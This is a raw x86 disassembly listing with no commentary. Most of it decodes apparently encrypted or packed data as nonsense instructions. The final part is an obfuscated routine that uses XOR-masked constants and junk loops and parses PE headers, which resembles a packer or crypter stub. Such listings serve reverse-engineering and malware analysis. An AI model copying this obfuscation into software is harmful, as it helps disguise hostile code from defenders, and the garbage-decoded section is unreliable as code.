  41f213:	in     eax,0xa3
  41f215:	add    bl,BYTE PTR [ebx-0x92b40e6]
  41f21b:	ror    BYTE PTR [eax+eax*1],cl
  41f21e:	sub    eax,DWORD PTR [ecx-0x4a06bc3c]
  41f224:	adc    edi,esi
  41f226:	rcr    eax,0xc
  41f229:	call   0x3b9d:0xd0096556
  41f230:	xor    esi,DWORD PTR [ebp+eiz*4+0x72]
  41f234:	dec    ecx
  41f235:	cmp    BYTE PTR [ecx-0x749a54cf],dl
  41f23b:	int3   
  41f23c:	and    al,0x4a
  41f23e:	xchg   esi,eax
  41f23f:	mov    al,ds:0x4844766f
  41f244:	aas    
  41f245:	int3   
  41f246:	lock sbb al,0x3d
  41f249:	cld    
  41f24a:	add    al,0xa0
  41f24c:	or     ah,BYTE PTR [ecx+0x73]
  41f24f:	mov    edx,0xd2aa9591
  41f254:	jno    0x41f232
  41f256:	cmp    DWORD PTR [eax+0x2a],eax
  41f259:	sub    ebp,0x43ec9aee
  41f25f:	jp     0x41f280
  41f261:	xchg   esi,eax
  41f262:	mov    al,ds:0xaff1e65c
  41f267:	xchg   BYTE PTR [esi],dh
  41f269:	sbb    bl,BYTE PTR [edi]
  41f26b:	pop    esp
  41f26c:	out    dx,eax
  41f26d:	pop    ecx
  41f26e:	and    eax,0xf8ce816
  41f273:	in     al,dx
  41f274:	mov    ?,WORD PTR [ebx-0x61]
  41f277:	jb     0x41f2cc
  41f279:	fild   WORD PTR [ebx+0x77]
  41f27c:	push   ebx
  41f27d:	pop    ds
  41f27e:	call   0x37805112
  41f283:	jbe    0x41f23c
  41f285:	and    al,0x1a
  41f287:	in     al,dx
  41f288:	(bad)  
  41f289:	in     al,dx
  41f28a:	pushf  
  41f28b:	ret    
  41f28c:	adc    ah,ch
  41f28e:	and    eax,eax
  41f290:	lahf   
  41f291:	mov    BYTE PTR [ebx-0x3508a3b8],dh
  41f297:	jecxz  0x41f219
  41f299:	pop    ecx
  41f29a:	push   0x15
  41f29c:	xchg   edx,eax
  41f29d:	dec    eax
  41f29e:	mov    bl,ch
  41f2a0:	fucomip st,st(0)
  41f2a2:	mov    cl,0xf8
  41f2a4:	jmp    FWORD PTR [esp+ebp*2+0x1490abb0]
  41f2ab:	push   es
  41f2ac:	sbb    al,0x8a
  41f2ae:	repz shr DWORD PTR ds:[ecx+0x68d561f0],0xcd
  41f2b7:	add    dl,bh
  41f2b9:	fidivr DWORD PTR [ebx]
  41f2bb:	les    edi,FWORD PTR [edx+0x5]
  41f2be:	hlt    
  41f2bf:	cli    
  41f2c0:	lods   al,BYTE PTR ds:[esi]
  41f2c1:	cmp    BYTE PTR [esp+edi*4-0xd4998cc],0x4f
  41f2c9:	repz jl 0x41f345
  41f2cc:	cmp    eax,0x41bbaed3
  41f2d1:	lods   al,BYTE PTR ds:[esi]
  41f2d2:	(bad)  
  41f2d3:	jmp    0xb381:0xfd7e866d
  41f2da:	mov    edx,0x219d6a55
  41f2df:	sub    dh,BYTE PTR ds:0xf8b50d80
  41f2e5:	cli    
  41f2e6:	add    ch,BYTE PTR [edi+0xe6de930]
  41f2ec:	sbb    al,0x3d
  41f2ee:	sti    
  41f2ef:	repz pop esp
  41f2f1:	scas   al,BYTE PTR es:[edi]
  41f2f2:	sub    ecx,DWORD PTR [edx]
  41f2f4:	sub    BYTE PTR ds:0x3019723b,ch
  41f2fa:	cli    
  41f2fb:	(bad)  
  41f2fc:	and    eax,0x6b08e24a
  41f301:	mov    edx,0x7bea5c96
  41f306:	retf   0x1fb4
  41f309:	push   es
  41f30a:	call   0xd26b:0xfed2e601
  41f311:	(bad)  [esi]
  41f313:	sbb    al,0x89
  41f315:	adc    al,0x4e
  41f317:	aad    0x22
  41f319:	jp     0x41f363
  41f31b:	popf   
  41f31c:	cmp    al,0xbb
  41f31e:	xor    DWORD PTR [eax],0x24d7105d
  41f324:	xchg   ecx,eax
  41f325:	sub    ecx,0xedfdd939
  41f32b:	jo     0x41f2ec
  41f32d:	xchg   ecx,eax
  41f32e:	ret    
  41f32f:	sahf   
  41f330:	inc    ebp
  41f331:	cli    
  41f332:	mov    dl,0x8a
  41f334:	(bad)  [edx-0x22]
  41f337:	pop    si
  41f339:	adc    BYTE PTR [ebp-0x24],bl
  41f33c:	aad    0xb0
  41f33e:	ja     0x41f2e2
  41f340:	push   es
  41f341:	dec    eax
  41f342:	dec    eax
  41f343:	cmp    dh,bh
  41f345:	pop    ecx
  41f346:	mov    BYTE PTR [edx*1-0x6668efb2],cl
  41f34d:	and    DWORD PTR [bx+si-0x1255],esi
  41f352:	call   0x8ad7219b
  41f357:	out    0xae,al
  41f359:	or     DWORD PTR [eax-0x59],0x20333fea
  41f360:	(bad)  
  41f361:	outs   dx,DWORD PTR ds:[esi]
  41f362:	jnp    0x41f3ad
  41f364:	fs js  0x41f3b9
  41f367:	sub    dl,BYTE PTR [ebx+0x78]
  41f36a:	jne    0x41f2f1
  41f36c:	out    dx,eax
  41f36d:	fdivr  QWORD PTR [ebp-0x1f455039]
  41f373:	mov    ebp,0xd3c5ef50
  41f378:	ins    BYTE PTR es:[edi],dx
  41f379:	or     BYTE PTR [edx+0x275e951d],dh
  41f37f:	add    dl,bh
  41f381:	push   ebx
  41f382:	adc    esi,DWORD PTR [edi+0x31]
  41f385:	ins    DWORD PTR es:[edi],dx
  41f386:	sti    
  41f387:	cmp    ebp,DWORD PTR [eax-0x58]
  41f38a:	cmc    
  41f38b:	vpmuludq ymm4,ymm4,YMMWORD PTR [ebp-0x5b]
  41f390:	lock (bad) 
  41f392:	mov    edi,0x2288b9f3
  41f397:	fs gs in al,0xa5
  41f39b:	jmp    0x41f36f
  41f39d:	cmp    DWORD PTR [edx+0x5879884e],ebx
  41f3a3:	rcr    DWORD PTR [edi+eax*4+0x53634d82],0x14
  41f3ab:	sub    BYTE PTR [edx],0xe9
  41f3ae:	pop    ecx
  41f3af:	push   0xfffffff3
  41f3b1:	stc    
  41f3b2:	inc    esp
  41f3b3:	sbb    al,BYTE PTR [edx]
  41f3b5:	ficomp DWORD PTR [edx]
  41f3b7:	les    esi,FWORD PTR [ecx+ebx*1]
  41f3ba:	in     al,0x78
  41f3bc:	sbb    DWORD PTR [esi+0x25910730],0x37
  41f3c3:	adc    DWORD PTR [ebx+0x50],esp
  41f3c6:	sub    BYTE PTR [esi-0x20c4d05c],ah
  41f3cc:	sar    DWORD PTR [ecx+0x15],1
  41f3cf:	add    eax,0xed1dde1f
  41f3d4:	inc    edx
  41f3d5:	adc    dh,BYTE PTR [eax]
  41f3d7:	lock ins BYTE PTR es:[edi],dx
  41f3d9:	push   ss
  41f3da:	retf   0x9bb8
  41f3dd:	in     al,0x3a
  41f3df:	jo     0x41f447
  41f3e1:	mov    esi,0xb062dff
  41f3e6:	bound  ebx,QWORD PTR [edi+0x704cef9c]
  41f3ec:	mov    bh,0x43
  41f3ee:	arpl   ax,ax
  41f3f0:	adc    al,0x31
  41f3f2:	mov    bl,0x1a
  41f3f4:	push   edi
  41f3f5:	scas   eax,DWORD PTR es:[edi]
  41f3f6:	push   0xd
  41f3f8:	(bad)  
  41f3f9:	fldcw  WORD PTR [edx-0x101d62e7]
  41f3ff:	mov    cl,0x49
  41f401:	jl     0x41f41c
  41f403:	loope  0x41f3ca
  41f405:	(bad)  
  41f406:	push   edx
  41f407:	mov    al,0x2
  41f409:	loope  0x41f3e6
  41f40b:	push   edi
  41f40c:	icebp  
  41f40d:	or     DWORD PTR [esi],0x43
  41f410:	fcom   QWORD PTR [ebp-0x26d7e68e]
  41f416:	stos   BYTE PTR es:[edi],al
  41f417:	xor    DWORD PTR [edi+esi*4-0x6dab157c],0xb5fe3232
  41f422:	pop    ds
  41f423:	icebp  
  41f424:	adc    DWORD PTR [ebp-0x56],ebp
  41f427:	clc    
  41f428:	bnd jno 0x41f49e
  41f42b:	ds addr16 int 0x15
  41f42f:	dec    edx
  41f430:	sub    esp,DWORD PTR [edi+0x19]
  41f433:	dec    edi
  41f434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f435:	jo     0x41f44a
  41f437:	retf   
  41f438:	call   0xa7e647f
  41f43d:	mov    ah,0x1b
  41f43f:	xor    al,0xcd
  41f441:	pushf  
  41f442:	ror    BYTE PTR [ebp-0x66],cl
  41f445:	bound  ecx,QWORD PTR ss:[ebx+0x21]
  41f449:	(bad)  
  41f44a:	sbb    BYTE PTR [esi-0x2d459885],dh
  41f450:	jb     0x41f477
  41f452:	dec    ebx
  41f453:	cli    
  41f454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f455:	loop   0x41f4b2
  41f457:	add    DWORD PTR [edx-0x7f],ecx
  41f45a:	mov    cr2,ebx
  41f45d:	jle    0x41f3ee
  41f45f:	scas   eax,DWORD PTR es:[edi]
  41f460:	shl    DWORD PTR [ebx+0x2b2e0da9],1
  41f466:	cmc    
  41f467:	push   edi
  41f468:	(bad)  
  41f469:	fldcw  WORD PTR [ebx-0x7ce7a9f5]
  41f46f:	stos   DWORD PTR es:[edi],eax
  41f470:	cs sahf 
  41f472:	pmuludq mm7,QWORD PTR [esi+0x759cea7e]
  41f479:	xor    BYTE PTR [ebx-0x787624cd],0x5c
  41f480:	into   
  41f481:	mov    ebx,0x48d9d40b
  41f486:	and    eax,ebp
  41f488:	cwde   
  41f489:	retf   0x4148
  41f48c:	nop
  41f48d:	cmp    BYTE PTR [eax-0x76],ah
  41f490:	aam    0x93
  41f492:	or     al,0x1c
  41f494:	fcomip st,st(0)
  41f496:	fimul  WORD PTR [edx]
  41f498:	fistp  QWORD PTR [edx+0x4cf4ec86]
  41f49e:	push   ds
  41f49f:	aaa    
  41f4a0:	and    eax,0xd914ca35
  41f4a5:	addr16 das 
  41f4a7:	rcr    DWORD PTR [ebx-0x61],cl
  41f4aa:	adc    dl,BYTE PTR [ebp+0x34d08e74]
  41f4b0:	lahf   
  41f4b1:	fiadd  WORD PTR [ebp-0xab0a53f]
  41f4b7:	iret   
  41f4b8:	clc    
  41f4b9:	(bad)  
  41f4ba:	adc    BYTE PTR [eax],cl
  41f4bc:	mov    esi,0x61370566
  41f4c1:	int    0xe0
  41f4c3:	lds    ecx,FWORD PTR [edx-0x31]
  41f4c6:	mov    ebp,0x3e8eef08
  41f4cb:	pop    ss
  41f4cc:	lahf   
  41f4cd:	mov    ch,0xe5
  41f4cf:	fwait
  41f4d0:	xlat   BYTE PTR ds:[ebx]
  41f4d1:	mov    BYTE PTR [ebp+0x6e],ch
  41f4d4:	push   es
  41f4d5:	pop    ebx
  41f4d6:	(bad)  
  41f4d7:	mov    dl,0x9e
  41f4d9:	aam    0x34
  41f4db:	sbb    DWORD PTR [ebp+0x75],edi
  41f4de:	mov    esp,0x6f0f94ad
  41f4e3:	fnstcw WORD PTR [ebp+0x4d]
  41f4e6:	out    dx,al
  41f4e7:	psubw  mm2,QWORD PTR [edi-0x45a223fb]
  41f4ee:	out    dx,eax
  41f4ef:	sahf   
  41f4f0:	jae    0x41f480
  41f4f2:	dec    edx
  41f4f3:	(bad)  
  41f4f4:	xor    BYTE PTR [ecx],ah
  41f4f6:	cli    
  41f4f7:	ror    DWORD PTR [edx+esi*1-0x11bfb5f7],cl
  41f4fe:	push   edx
  41f4ff:	(bad)  [ebx]
  41f501:	stos   DWORD PTR es:[edi],eax
  41f502:	test   al,0xd
  41f504:	mov    ds:0x56cd95f9,al
  41f509:	mov    ds:0x73e105bd,al
  41f50e:	jl     0x41f4a5
  41f510:	cmp    al,0x31
  41f512:	inc    ebx
  41f513:	sub    bh,cl
  41f515:	or     al,0x6
  41f517:	stc    
  41f518:	(bad)  
  41f519:	out    0x5,al
  41f51b:	adc    eax,0xc71272c7
  41f520:	add    ecx,eax
  41f522:	enter  0x392c,0x37
  41f526:	jb     0x41f568
  41f528:	jp     0x41f57a
  41f52a:	jbe    0x41f51a
  41f52c:	int3   
  41f52d:	push   ecx
  41f52e:	(bad)  
  41f52f:	sahf   
  41f530:	(bad)  
  41f532:	rep ins BYTE PTR es:[edi],dx
  41f534:	int3   
  41f535:	scas   al,BYTE PTR es:[edi]
  41f536:	retf   0xde1
  41f539:	lahf   
  41f53a:	mov    ah,0xa3
  41f53c:	int    0xf8
  41f53e:	sahf   
  41f53f:	mov    ebp,0xabc4cfd9
  41f544:	aaa    
  41f545:	xor    eax,0xb28ae591
  41f54a:	data16 sahf 
  41f54c:	rcl    DWORD PTR [bp+di],cl
  41f54f:	or     DWORD PTR [ebx+0xb],eax
  41f552:	xor    edx,DWORD PTR [esi-0x33149979]
  41f558:	sbb    esp,DWORD PTR [edx+0x74dca59]
  41f55e:	jne    0x41f4ea
  41f560:	or     DWORD PTR [eax-0x7c],ebx
  41f563:	rcl    ebp,0x70
  41f566:	rep fs stos DWORD PTR es:[edi],eax
  41f569:	js     0x41f5c3
  41f56b:	lods   eax,DWORD PTR ds:[esi]
  41f56c:	loop   0x41f5ad
  41f56e:	dec    eax
  41f56f:	and    DWORD PTR [esi-0x20],edx
  41f572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f573:	std    
  41f574:	or     ch,ah
  41f576:	inc    esp
  41f577:	dec    eax
  41f578:	xlat   BYTE PTR ds:[ebx]
  41f579:	(bad)  
  41f57a:	pop    ds
  41f57b:	icebp  
  41f57c:	les    ecx,FWORD PTR [edi-0x7c39ff16]
  41f582:	mov    ebx,0x3516c19e
  41f587:	mov    dl,0xc8
  41f589:	mov    ebx,0x23211849
  41f58e:	push   0xf2ea2f08
  41f593:	fst    QWORD PTR [eax-0x70]
  41f596:	and    BYTE PTR [eax+0x78f5244d],ch
  41f59c:	inc    ebp
  41f59d:	mov    ah,0xe0
  41f59f:	into   
  41f5a0:	mov    BYTE PTR [ecx],dh
  41f5a2:	mov    dl,0x3b
  41f5a4:	mov    esi,0x2152b729
  41f5a9:	pusha  
  41f5aa:	adc    ch,bl
  41f5ac:	adc    eax,0x5cae8ea
  41f5b1:	mov    al,0xe2
  41f5b3:	call   0x2f0f28e
  41f5b8:	mov    edx,0x6ca4a4b8
  41f5bd:	or     BYTE PTR [esi-0x1717a5e5],ah
  41f5c3:	outs   dx,BYTE PTR ds:[esi]
  41f5c4:	(bad)  
  41f5c5:	jmp    0x41f59a
  41f5c7:	xor    DWORD PTR [eax-0x44b73492],esi
  41f5cd:	daa    
  41f5ce:	lahf   
  41f5cf:	jbe    0x41f59f
  41f5d1:	push   esp
  41f5d2:	or     al,0xb
  41f5d4:	scas   eax,DWORD PTR es:[edi]
  41f5d5:	cld    
  41f5d6:	pushf  
  41f5d7:	sub    DWORD PTR [edx+0x4f78c171],ebx
  41f5dd:	or     BYTE PTR [edi*4+0x4d2e89d7],cl
  41f5e4:	ret    
  41f5e5:	adc    eax,0xb6e5b90b
  41f5ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5eb:	mov    edx,0x45efd9fc
  41f5f0:	inc    ebx
  41f5f1:	fcomp  DWORD PTR [ebx+edx*4+0x4c15e90a]
  41f5f8:	inc    eax
  41f5f9:	pop    edi
  41f5fa:	cmp    DWORD PTR [edi+ebx*4],0x8361f1ca
  41f601:	ss cmp eax,0xdb871423
  41f607:	adc    DWORD PTR [ebx-0x14f455b8],esp
  41f60d:	imul   ebx,DWORD PTR [ebp-0x248332d4],0x6c305
  41f617:	or     DWORD PTR [ecx-0x19f851ec],ebp
  41f61d:	scas   eax,DWORD PTR es:[edi]
  41f61e:	add    ebp,DWORD PTR [ebx-0x6179f319]
  41f624:	mov    ebp,0x60508754
  41f629:	cmp    DWORD PTR [ebx],edx
  41f62b:	test   al,0x6
  41f62d:	leave  
  41f62e:	mov    ah,BYTE PTR [edi+0x4c4f91f6]
  41f634:	loop   0x41f66e
  41f636:	call   0x6ccb370d
  41f63b:	fistp  WORD PTR [esi-0x7bb507f]
  41f641:	push   cs
  41f642:	popa   
  41f643:	jns    0x41f669
  41f645:	fwait
  41f646:	mov    ebx,0x3a6a371e
  41f64b:	aaa    
  41f64c:	add    eax,0xb9956b0b
  41f651:	ret    
  41f652:	push   esi
  41f653:	inc    edx
  41f654:	jno    0x41f664
  41f656:	adc    BYTE PTR [ebx-0x3c],bh
  41f659:	mov    al,0xb
  41f65b:	adc    eax,0x2f1ebfc7
  41f660:	call   0x12074fb2
  41f665:	pop    ss
  41f666:	mov    ebx,0xd18fd159
  41f66b:	mov    edx,0x82162867
  41f670:	pop    ds
  41f671:	jne    0x41f606
  41f673:	repz in eax,0x97
  41f676:	call   0x689cfcc4
  41f67b:	push   esp
  41f67c:	jl     0x41f698
  41f67e:	dec    ebp
  41f67f:	loope  0x41f690
  41f681:	pop    ds
  41f682:	cmc    
  41f683:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f684:	sbb    DWORD PTR [edx-0x6],eax
  41f687:	lods   eax,DWORD PTR ds:[esi]
  41f688:	cmp    eax,0x3b2c7a4c
  41f68d:	xchg   ecx,eax
  41f68e:	mov    ebp,0x4727e971
  41f693:	pusha  
  41f694:	les    edx,FWORD PTR [ebp+0x12]
  41f697:	test   al,0x56
  41f699:	xlat   BYTE PTR ds:[ebx]
  41f69a:	push   ds
  41f69b:	(bad)  
  41f69c:	mov    edi,0xc945f613
  41f6a1:	sub    al,0x98
  41f6a3:	jne    0x41f6dd
  41f6a5:	neg    BYTE PTR [ebx-0x203e4ef7]
  41f6ab:	lds    edx,FWORD PTR [edx-0x308e5163]
  41f6b1:	add    DWORD PTR [edi],esi
  41f6b3:	push   esi
  41f6b4:	cli    
  41f6b5:	loopne 0x41f637
  41f6b7:	stc    
  41f6b8:	shl    DWORD PTR [ebx+0x37],0x1e
  41f6bc:	jge    0x41f670
  41f6be:	(bad)  
  41f6c0:	int3   
  41f6c1:	cmp    DWORD PTR [ebp+0x19],eax
  41f6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6c5:	call   0x1bba6617
  41f6ca:	pushf  
  41f6cb:	stos   BYTE PTR es:[edi],al
  41f6cc:	retf   
  41f6cd:	out    dx,al
  41f6ce:	push   0x36888677
  41f6d3:	hlt    
  41f6d4:	inc    esp
  41f6d5:	loope  0x41f6a9
  41f6d7:	jl     0x41f6a7
  41f6d9:	or     BYTE PTR [edx],ch
  41f6db:	imul   edi,DWORD PTR [ebx+eax*1+0x1e],0x31
  41f6e0:	sar    DWORD PTR [ebx],cl
  41f6e2:	mov    ecx,0xa58ecdc1
  41f6e7:	fwait
  41f6e8:	jmp    0x41f6b8
  41f6ea:	ret    0x24b3
  41f6ed:	lahf   
  41f6ee:	in     eax,dx
  41f6ef:	fst    DWORD PTR [eax+0x5c7d2613]
  41f6f5:	aas    
  41f6f6:	(bad)  
  41f6f7:	dec    ebx
  41f6f8:	sbb    esp,DWORD PTR [ecx-0x3245ab1b]
  41f6fe:	aaa    
  41f6ff:	mov    dh,0x60
  41f701:	mov    dh,0x40
  41f703:	popa   
  41f704:	bound  edx,QWORD PTR [esi]
  41f706:	out    dx,al
  41f707:	jmp    0xac3e:0x51f8f1bf
  41f70e:	(bad)  
  41f70f:	shl    DWORD PTR ds:0x5df9e4f6,1
  41f715:	sub    BYTE PTR [ebp-0x10c65d7d],0xf9
  41f71c:	out    dx,al
  41f71d:	div    ch
  41f71f:	ja     0x41f73f
  41f721:	and    DWORD PTR ds:0x92530063,eax
  41f727:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f728:	sub    DWORD PTR [eax+0x7a3e60a4],esp
  41f72e:	xchg   edi,eax
  41f72f:	adc    bl,BYTE PTR [ecx+0x54]
  41f732:	mov    esi,0xd0d0f05c
  41f737:	and    ebx,DWORD PTR [ebp-0x24]
  41f73a:	gs cmp ch,dl
  41f73d:	pop    esi
  41f73e:	adc    eax,DWORD PTR [edi+ebp*2+0x37]
  41f742:	adc    esp,DWORD PTR [eax+0x6b4f1bae]
  41f748:	test   DWORD PTR [ebp-0x35],esp
  41f74b:	push   0xffffffa6
  41f74d:	rcr    BYTE PTR [ebx+eax*2-0x3519913b],1
  41f754:	mov    ch,0x92
  41f756:	push   eax
  41f757:	nop
  41f758:	(bad)  [esi-0x296836c1]
  41f75e:	loope  0x41f764
  41f760:	sub    al,0x31
  41f762:	mov    ebx,0x73ad551
  41f767:	gs addr16 add al,0xe
  41f76b:	jns    0x41f720
  41f76d:	shl    DWORD PTR [esi],cl
  41f76f:	out    0x36,eax
  41f771:	les    ecx,FWORD PTR [eax]
  41f773:	in     al,dx
  41f774:	dec    esi
  41f775:	lods   al,BYTE PTR ds:[esi]
  41f776:	ror    DWORD PTR [ebx-0x3531aeb6],1
  41f77c:	out    0x2c,al
  41f77e:	rol    BYTE PTR [ebx-0x1c620e6b],0xde
  41f785:	mov    eax,ds:0xe7256f39
  41f78a:	lahf   
  41f78b:	pop    ss
  41f78c:	shl    BYTE PTR [ebx-0x63],cl
  41f78f:	ret    0xae4b
  41f792:	gs scas al,BYTE PTR es:[edi]
  41f794:	sar    eax,1
  41f796:	es inc edi
  41f798:	mov    dh,0xe4
  41f79a:	inc    ebp
  41f79b:	lods   al,BYTE PTR ds:[esi]
  41f79c:	or     eax,DWORD PTR [edx*1-0x79d416f4]
  41f7a3:	xchg   ebx,eax
  41f7a4:	mov    ebp,0x78ec5736
  41f7a9:	mov    al,0x2e
  41f7ab:	xchg   ebx,eax
  41f7ac:	cdq    
  41f7ad:	mov    esi,0x88d0b063
  41f7b2:	add    al,0x5
  41f7b4:	or     al,0x9b
  41f7b6:	xlat   BYTE PTR ds:[ebx]
  41f7b7:	mov    dl,0x68
  41f7b9:	jmp    0x19c3:0x529e26f8
  41f7c0:	or     al,0x24
  41f7c2:	and    ah,BYTE PTR [si-0x61]
  41f7c6:	in     eax,dx
  41f7c7:	xor    al,0xcc
  41f7c9:	in     eax,0x6b
  41f7cb:	push   edi
  41f7cc:	fucomip st,st(1)
  41f7ce:	dec    eax
  41f7cf:	mov    edi,0x66442bc3
  41f7d4:	cdq    
  41f7d5:	jbe    0x41f81a
  41f7d7:	jmp    DWORD PTR [edx]
  41f7d9:	mov    cl,0x9d
  41f7db:	and    DWORD PTR [ecx-0x5648699a],0xffffffed
  41f7e2:	imul   ebx,DWORD PTR [eax],0xffffffe0
  41f7e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7e6:	cmp    al,BYTE PTR [esi]
  41f7e8:	lahf   
  41f7e9:	sub    BYTE PTR [edx],bl
  41f7eb:	je     0x41f792
  41f7ed:	repnz fwait
  41f7ef:	lds    esi,FWORD PTR [ebx*1+0x6f0f4759]
  41f7f6:	retf   0x46e1
  41f7f9:	das    
  41f7fa:	in     al,0x9c
  41f7fc:	pop    edx
  41f7fd:	bound  ebx,QWORD PTR [eax+0x4cf4a304]
  41f803:	cdq    
  41f804:	xchg   BYTE PTR [edx-0x5832e223],bh
  41f80a:	scas   eax,DWORD PTR es:[edi]
  41f80b:	inc    edx
  41f80c:	fadd   st,st(7)
  41f80e:	retf   0x9819
  41f811:	jecxz  0x41f822
  41f813:	arpl   si,dx
  41f815:	test   al,0x9b
  41f817:	int    0x82
  41f819:	mov    ds:0x40904ff0,al
  41f81e:	push   ss
  41f81f:	(bad)  
  41f820:	int3   
  41f821:	pop    ss
  41f822:	and    BYTE PTR [ebx+0x5f5bc10c],bl
  41f828:	es ret 0x5e46
  41f82c:	mov    ebp,DWORD PTR [esi+0x7c59fe54]
  41f832:	or     eax,0x267db0d7
  41f837:	xlat   BYTE PTR ds:[ebx]
  41f838:	add    al,0x1d
  41f83b:	lahf   
  41f83c:	lods   al,BYTE PTR ds:[esi]
  41f83d:	xchg   edx,eax
  41f83e:	xor    esi,DWORD PTR [esi+0x17dd671d]
  41f844:	and    eax,0xb08b5d83
  41f849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f84a:	xor    ch,BYTE PTR [esi-0x2e0ffb89]
  41f850:	or     edx,esp
  41f852:	daa    
  41f853:	cmp    bh,BYTE PTR [eax+eiz*8-0x6c293566]
  41f85a:	and    eax,0x9474cc34
  41f85f:	jmp    0xb176:0xe69460ee
  41f866:	inc    esp
  41f867:	sub    eax,0xd1bd4c8c
  41f86c:	mov    ds:0x5356ae60,al
  41f871:	cmp    edx,DWORD PTR [ecx]
  41f873:	inc    ecx
  41f874:	dec    edi
  41f875:	mov    edx,0x3272fa
  41f87a:	sub    eax,edx
  41f87c:	or     ecx,DWORD PTR ds:0x426eb9
  41f882:	mov    ecx,0x75108b3
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429d65
  41f8e9:	mov    edx,DWORD PTR ds:0x42af5d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x430a00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x430a40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
